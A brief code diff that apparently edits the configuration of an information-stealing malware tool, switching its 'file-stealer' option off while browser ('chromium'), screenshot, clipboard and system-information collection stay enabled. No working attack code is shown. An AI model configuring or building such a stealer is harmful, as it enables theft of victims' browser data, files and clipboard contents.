@@ -4,7 +4,7 @@ CONFIG = {
     "chromium": True,
     "system-infos": True,
     "screenshot": True,
-    "file-stealer": True,
+    "file-stealer": False,
     "clipboard": True,
     "installed-softwares": True,
     "installed-browsers": True,
